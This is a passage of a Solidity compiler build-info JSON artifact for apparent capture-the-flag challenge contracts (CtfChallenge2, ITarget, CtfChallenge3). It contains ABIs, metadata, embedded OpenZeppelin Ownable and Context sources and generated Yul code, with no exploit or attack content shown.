:\"target\",\"type\":\"address\"}],\"name\":\"indirectCall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"errors\":{\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge2.sol\":\"CtfChallenge2\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/CtfChallenge2.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\nimport {Ownable} from \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\n// Uncomment this line to use console.log\\n// import \\\"hardhat/console.sol\\\";\\n\\ncontract CtfChallenge2 is Ownable {\\n  constructor() Ownable(msg.sender) {}\\n\\n  function indirectCall(address target) public onlyOwner {\\n    ITarget(target).justCallMe();\\n  }\\n}\\n\\ninterface ITarget {\\n  function justCallMe() external;\\n}\\n\",\"keccak256\":\"0xbed3022aaddd1b9b716be0b47c966bfb09e2615b6e2239eafd90bea9f89ef135\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[{"astId":8,"contract":"contracts/CtfChallenge2.sol:CtfChallenge2","label":"_owner","offset":0,"slot":"0","type":"t_address"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"}}},"userdoc":{"kind":"user","methods":{},"version":1}},"ITarget":{"abi":[{"inputs":[],"name":"justCallMe","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"justCallMe()":"82cb05c6"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"justCallMe\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge2.sol\":\"ITarget\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"contracts/CtfChallenge2.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\nimport {Ownable} from \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\n// Uncomment this line to use console.log\\n// import \\\"hardhat/console.sol\\\";\\n\\ncontract CtfChallenge2 is Ownable {\\n  constructor() Ownable(msg.sender) {}\\n\\n  function indirectCall(address target) public onlyOwner {\\n    ITarget(target).justCallMe();\\n  }\\n}\\n\\ninterface ITarget {\\n  function justCallMe() external;\\n}\\n\",\"keccak256\":\"0xbed3022aaddd1b9b716be0b47c966bfb09e2615b6e2239eafd90bea9f89ef135\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/CtfChallenge3.sol":{"CtfChallenge3":{"abi":[{"inputs":[{"internalType":"address","name":"target","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"OwnableInvalidOwner","type":"error"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"OwnableUnauthorizedAccount","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"errors":{"OwnableInvalidOwner(address)":[{"details":"The owner is not a valid owner account. (eg. `address(0)`)"}],"OwnableUnauthorizedAccount(address)":[{"details":"The caller account is not authorized to perform an operation."}]},"kind":"dev","methods":{"owner()":{"details":"Returns the address of the current owner."},"renounceOwnership()":{"details":"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."},"transferOwnership(address)":{"details":"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."}},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_50":{"entryPoint":null,"id":50,"parameterSlots":1,"returnSlots":0},"@_5650":{"entryPoint":null,"id":5650,"parameterSlots":1,"returnSlots":0},"@_transferOwnership_146":{"entryPoint":283,"id":146,"parameterSlots":1,"returnSlots":0},"abi_decode_t_address_fromMemory":{"entryPoint":557,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address_fromMemory":{"entryPoint":578,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":623,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_t_address__to_t_address__fromStack_reversed":{"entryPoint":638,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"cleanup_t_address":{"entryPoint":516,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":484,"id":null,"parameterSlots":1,"returnSlots":1},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":479,"id":null,"parameterSlots":0,"returnSlots":0},"validator_revert_t_address":{"entryPoint":534,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:1551:14","nodeType":"YulBlock","src":"0:1551:14","statements":[{"body":{"nativeSrc":"47:35:14","nodeType":"YulBlock","src":"47:35:14","statements":[{"nativeSrc":"57:19:14","nodeType":"YulAssignment","src":"57:19:14","value":{"arguments":[{"kind":"number","nativeSrc":"73:2:14","nodeType":"YulLiteral","src":"73:2:14","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"67:5:14","nodeType":"YulIdentifier","src":"67:5:14"},"nativeSrc":"67:9:14","nodeType":"YulFunctionCall","src":"67:9:14"},"variableNames":[{"name":"memPtr","nativeSrc":"57:6:14","nodeType":"YulIdentifier","src":"57:6:14"}]}]},"name":"allocate_unbounded","nativeSrc":"7:75:14","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"40:6:14","nodeType":"YulTypedName","src":"40:6:14","type":""}],"src":"7:75:14"},{"body":{"nativeSrc":"177:28:14","nodeType":"YulBlock","src":"177:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"194:1:14","nodeType":"YulLiteral","src":"194:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"197:1:14","nodeType":"YulLiteral","src":"197:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"187:6:14","nodeType":"YulIdentifier","src":"187:6:14"},"nativeSrc":"187:12:14","nodeType":"YulFunctionCall","src":"187:12:14"},"nativeSrc":"187:12:14","nodeType":"YulExpressionStatement","src":"187:12:14"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"88:117:14","nodeType":"YulFunctionDefinition","src":"88:117:14"},{"body":{"nativeSrc":"300:28:14","nodeType":"YulBlock","src":"300:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"317:1:14","nodeType":"YulLiteral","src":"317:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"320:1:14","nodeType":"YulLiteral","src":"320:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"310:6:14","nodeType":"YulIdentifier","src":"310:6:14"},"nativeSrc":"310:12:14","nodeType":"YulFunctionCall","src":"310:12:14"},"nativeSrc":"310:12:14","nodeType":"YulExpressionStatement","src":"310:12:14"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"211:117:14","nodeType":"YulFunctionDefinition","src":"211:117:14"},{"body":{"nativeSrc":"379:81:14","nodeType":"YulBlock","src":"379:81:14","statements":[{"nativeSrc":"389:65:14","nodeType":"YulAssignment","src":"389:65:14","value":{"arguments":[{"name":"value","nativeSrc":"404:5:14","nodeType":"YulIdentifier","src":"404:5:14"},{"kind":"number","nativeSrc":"411:42:14","nodeType":"YulLiteral","src":"411:42:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"400:3:14","nodeType":"YulIdentifier","src":"400:3:14"},"nativeSrc":"400:54:14","nodeType":"YulFunctionCall","src":"400:54:14"},"variableNames":[{"name":"cleaned","nativeSrc":"389:7:14","nodeType":"YulIdentifier","src":"389:7:14"}]}]},"name":"cleanup_t_uint160","nativeSrc":"334:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"361:5:14","nodeType":"YulTypedName","src":"361:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"371:7:14","nodeType":"YulTypedName","src":"371:7:14","type":""}],"src":"334:126:14"},{"body":{"nativeSrc":"511:51:14","nodeType":"YulBlock","src":"511:51:14","statements":[{"nativeSrc":"521:35:14","nodeType":"YulAssignment","src":"521:35:14","value":{"arguments":[{"name":"value","nativeSrc":"550:5:14","nodeType":"YulIdentifier","src":"550:5:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"532:17:14","nodeType":"YulIdentifier","src":"532:17:14"},"nativeSrc":"532:24:14","nodeType":"YulFunctionCall","src":"532:24:14"},"variableNames":[{"name":"cleaned","nativeSrc":"521:7:14","nodeType":"YulIdentifier","src":"521:7:14"}]}]},"name":"cleanup_t_address","nativeSrc":"466:96:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"493:5:14","nodeType":"YulTypedName","src":"493:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"503:7:14","nodeType":"YulTypedName","src":"503:7:14","type":""}],"src":"466:96:14"},{"body":{"nativeSrc":"611:79:14","nodeType":"YulBlock","src":"611:79:14","statements":[{"body":{"nativeSrc":"668:16:14","nodeType":"YulBlock","src":"668:16:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"677:1:14","nodeType":"YulLiteral","src":"677:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"680:1:14","nodeType":"YulLiteral","src":"680:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"670:6:14","nodeType":"YulIdentifier","src":"670:6:14"},"nativeSrc":"670:12:14","nodeType":"YulFunctionCall","src":"670:12:14"},"nativeSrc":"670:12:14","nodeType":"YulExpressionStatement","src":"670:12:14"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"634:5:14","nodeType":"YulIdentifier","src":"634:5:14"},{"arguments":[{"name":"value","nativeSrc":"659:5:14","nodeType":"YulIdentifier","src":"659:5:14"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"641:17:14","nodeType":"YulIdentifier","src":"641:17:14"},"nativeSrc":"641:24:14","nodeType":"YulFunctionCall","src":"641:24:14"}],"functionName":{"name":"eq","nativeSrc":"631:2:14","nodeType":"YulIdentifier","src":"631:2:14"},"nativeSrc":"631:35:14","nodeType":"YulFunctionCall","src":"631:35:14"}],"functionName":{"name":"iszero","nativeSrc":"624:6:14","nodeType":"YulIdentifier","src":"624:6:14"},"nativeSrc":"624:43:14","nodeType":"YulFunctionCall","src":"624:43:14"},"nativeSrc":"621:63:14","nodeType":"YulIf","src":"621:63:14"}]},"name":"validator_revert_t_address","nativeSrc":"568:122:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"604:5:14","nodeType":"YulTypedName","src":"604:5:14","type":""}],"src":"568:122:14"},{"body":{"nativeSrc":"759:80:14","nodeType":"YulBlock","src":"759:80:14","statements":[{"nativeSrc":"769:22:14","nodeType":"YulAssignment","src":"769:22:14","value":{"arguments":[{"name":"offset","nativeSrc":"784:6:14","nodeType":"YulIdentifier","src":"784:6:14"}],"functionName":{"name":"mload","nativeSrc":"778:5:14","nodeType":"YulIdentifier","src":"778:5:14"},"nativeSrc":"778:13:14","nodeType":"YulFunctionCall","src":"778:13:14"},"variableNames":[{"name":"value","nativeSrc":"769:5:14","nodeType":"YulIdentifier","src":"769:5:14"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"827:5:14","nodeType":"YulIdentifier","src":"827:5:14"}],"functionName":{"name":"validator_revert_t_address","nativeSrc":"800:26:14","nodeType":"YulIdentifier","src":"800:26:14"},"nativeSrc":"800:33:14","nodeType":"YulFunctionCall","src":"800:33:14"},"nativeSrc":"800:33:14","nodeType":"YulExpressionStatement","src":"800:33:14"}]},"name":"abi_decode_t_address_fromMemory","nativeSrc":"696:143:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"737:6:14","nodeType":"YulTypedName","src":"737:6:14","type":""},{"name":"end","nativeSrc":"745:3:14","nodeType":"YulTypedName","src":"745:3:14","type":""}],"returnVariables":[{"name":"value","nativeSrc":"753:5:14","nodeType":"YulTypedName","src":"753:5:14","type":""}],"src":"696:143:14"},{"body":{"nativeSrc":"922:274:14","nodeType":"YulBlock","src":"922:274:14","statements":[{"body":{"nativeSrc":"968:83:14","nodeType":"YulBlock","src":"968:83:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"970:77:14","nodeType":"YulIdentifier","src":"970:77:14"},"nativeSrc":"970:79:14","nodeType":"YulFunctionCall","src":"970:79:14"},"nativeSrc":"970:79:14","nodeType":"YulExpressionStatement","src":"970:79:14"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"943:7:14","nodeType":"YulIdentifier","src":"943:7:14"},{"name":"headStart","nativeSrc":"952:9:14","nodeType":"YulIdentifier","src":"952:9:14"}],"functionName":{"name":"sub","nativeSrc":"939:3:14","nodeType":"YulIdentifier","src":"939:3:14"},"nativeSrc":"939:23:14","nodeType":"YulFunctionCall","src":"939:23:14"},{"kind":"number","nativeSrc":"964:2:14","nodeType":"YulLiteral","src":"964:2:14","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"935:3:14","nodeType":"YulIdentifier","src":"935:3:14"},"nativeSrc":"935:32:14","nodeType":"YulFunctionCall","src":"935:32:14"},"nativeSrc":"932:119:14","nodeType":"YulIf","src":"932:119:14"},{"nativeSrc":"1061:128:14","nodeType":"YulBlock","src":"1061:128:14","statements":[{"nativeSrc":"1076:15:14","nodeType":"YulVariableDeclaration","src":"1076:15:14","value":{"kind":"number","nativeSrc":"1090:1:14","nodeType":"YulLiteral","src":"1090:1:14","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"1080:6:14","nodeType":"YulTypedName","src":"1080:6:14","type":""}]},{"nativeSrc":"1105:74:14","nodeType":"YulAssignment","src":"1105:74:14","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1151:9:14","nodeType":"YulIdentifier","src":"1151:9:14"},{"name":"offset","nativeSrc":"1162:6:14","nodeType":"YulIdentifier","src":"1162:6:14"}],"functionName":{"name":"add","nativeSrc":"1147:3:14","nodeType":"YulIdentifier","src":"1147:3:14"},"nativeSrc":"1147:22:14","nodeType":"YulFunctionCall","src":"1147:22:14"},{"name":"dataEnd","nativeSrc":"1171:7:14","nodeType":"YulIdentifier","src":"1171:7:14"}],"functionName":{"name":"abi_decode_t_address_fromMemory","nativeSrc":"1115:31:14","nodeType":"YulIdentifier","src":"1115:31:14"},"nativeSrc":"1115:64:14","nodeType":"YulFunctionCall","src":"1115:64:14"},"variableNames":[{"name":"value0","nativeSrc":"1105:6:14","nodeType":"YulIdentifier","src":"1105:6:14"}]}]}]},"name":"abi_decode_tuple_t_address_fromMemory","nativeSrc":"845:351:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"892:9:14","nodeType":"YulTypedName","src":"892:9:14","type":""},{"name":"dataEnd","nativeSrc":"903:7:14","nodeType":"YulTypedName","src":"903:7:14","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"915:6:14","nodeType":"YulTypedName","src":"915:6:14","type":""}],"src":"845:351:14"},{"body":{"nativeSrc":"1267:53:14","nodeType":"YulBlock","src":"1267:53:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"1284:3:14","nodeType":"YulIdentifier","src":"1284:3:14"},{"arguments":[{"name":"value","nativeSrc":"1307:5:14","nodeType":"YulIdentifier","src":"1307:5:14"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"1289:17:14","nodeType":"YulIdentifier","src":"1289:17:14"},"nativeSrc":"1289:24:14","nodeType":"YulFunctionCall","src":"1289:24:14"}],"functionName":{"name":"mstore","nativeSrc":"1277:6:14","nodeType":"YulIdentifier","src":"1277:6:14"},"nativeSrc":"1277:37:14","nodeType":"YulFunctionCall","src":"1277:37:14"},"nativeSrc":"1277:37:14","nodeType":"YulExpressionStatement","src":"1277:37:14"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"1202:118:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1255:5:14","nodeType":"YulTypedName","src":"1255:5:14","type":""},{"name":"pos","nativeSrc":"1262:3:14","nodeType":"YulTypedName","src":"1262:3:14","type":""}],"src":"1202:118:14"},{"body":{"nativeSrc":"1424:124:14","nodeType":"YulBlock","src":"1424:124:14","statements":[{"nativeSrc":"1434:26:14","nodeType":"YulAssignment","src":"1434:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"1446:9:14","nodeType":"YulIdentifier","src":"1446:9:14"},{"kind":"number","nativeSrc":"1457:2:14","nodeType":"YulLiteral","src":"1457:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1442:3:14","nodeType":"YulIdentifier","src":"1442:3:14"},"nativeSrc":"1442:18:14","nodeType":"YulFunctionCall","src":"1442:18:14"},"variableNames":[{"name":"tail","nativeSrc":"1434:4:14","nodeType":"YulIdentifier","src":"1434:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"1514:6:14","nodeType":"YulIdentifier","src":"1514:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"1527:9:14","nodeType":"YulIdentifier","src":"1527:9:14"},{"kind":"number","nativeSrc":"1538:1:14","nodeType":"YulLiteral","src":"1538:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1523:3:14","nodeType":"YulIdentifier","src":"1523:3:14"},"nativeSrc":"1523:17:14","nodeType":"YulFunctionCall","src":"1523:17:14"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"1470:43:14","nodeType":"YulIdentifier","src":"1470:43:14"},"nativeSrc":"1470:71:14","nodeType":"YulFunctionCall","src":"1470:71:14"},"nativeSrc":"1470:71:14","nodeType":"YulExpressionStatement","src":"1470:71:14"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nativeSrc":"1326:222:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1396:9:14","nodeType":"YulTypedName","src":"1396:9:14","type":""},{"name":"value0","nativeSrc":"1408:6:14","nodeType":"YulTypedName","src":"1408:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"1419:4:14","nodeType":"YulTypedName","src":"1419:4:14","type":""}],"src":"1326:222:14"}]},"contents":"{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function 